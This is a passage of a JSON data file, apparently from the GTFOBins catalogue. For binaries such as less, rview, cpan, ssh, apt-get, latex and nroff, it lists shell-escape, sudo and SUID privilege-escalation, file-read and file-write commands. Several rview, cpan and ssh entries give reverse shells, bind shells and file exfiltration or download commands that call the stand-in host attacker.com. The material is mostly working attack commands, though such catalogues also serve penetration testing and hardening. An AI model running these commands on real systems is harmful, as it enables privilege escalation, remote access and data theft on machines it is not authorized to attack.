          "code": "less /etc/profile\n:e file_to_read\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "echo DATA | less\nsfile_to_write\nq\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        },
        {
          "code": "less file_to_write\nv\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo less /etc/profile\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./less file_to_read",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "rview": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "rview -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "rview file_to_write\niDATA\n^[\nw!\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "rview file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo rview -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ],
      "limited-suid": [
        {
          "code": "./rview -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "cpan": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "cpan\n! exec '/bin/bash'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "sudo cpan\n! exec '/bin/bash'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "comm": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ssh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ssh localhost $SHELL --noprofile --norc",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n",
          "description": "It can download remote files."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nssh -F $LFILE localhost\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dos2unix": {
    "description": "",
    "functions": {
      "file-write": [
        {
          "code": "LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n \"$LFILE1\" \"$LFILE2\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ]
    }
  },
  "run-parts": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "run-parts --new-session --regex '^sh$' /bin",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo run-parts --new-session --regex '^sh$' /bin",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "soelim": {
    "description": "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nsoelim \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./soelim \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "jq": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rlwrap": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rlwrap /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./rlwrap -H /dev/null /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rlwrap /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "grc": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "grc --pty /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo grc --pty /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "check_log": {
    "description": "This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "fmt": {
    "description": "The read file content is not binary-safe.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_read\nfmt -999 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "espeak": {
    "description": "The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nespeak -qXf \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "gzip": {
    "description": "There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ngzip -f $LFILE -t\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_read\ngzip -c $LFILE | gzip -d\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./gzip -f $LFILE -t\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "apt-get": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "apt-get changelog apt\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo apt-get changelog apt\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ld.so": {
    "description": "`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:\n\n```\n$ strings /proc/self/exe | head -1\n/lib64/ld-linux-x86-64.so.2\n```\n\nIt's worth noting that the spawned process will be the loader, not the target executable, this might aid evasion. See https://shyft.us/posts/20230526_linux_command_proxy.html for more information.\n",
    "functions": {
      "shell": [
        {
          "code": "/lib/ld.so /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./ld.so /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo /lib/ld.so /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "enscript": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "links": {
    "description": "The result is displayed in a TUI interface.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nlinks \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./links \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo links \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ghc": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ghc -e 'System.Process.callCommand \"/bin/sh\"'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "latex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "join": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "minicom": {
    "description": "Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.",
    "functions": {
      "shell": [
        {
          "code": "minicom -D /dev/null\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp)\necho \"! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)\" >$TF\nminicom -D /dev/null -S $TF\nreset^J\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo minicom -D /dev/null\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./minicom -D /dev/null\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "nroff": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nnroff $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tasksh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "tasksh\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./tasksh\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo tasksh\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "virsh": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "file-write": [
        {
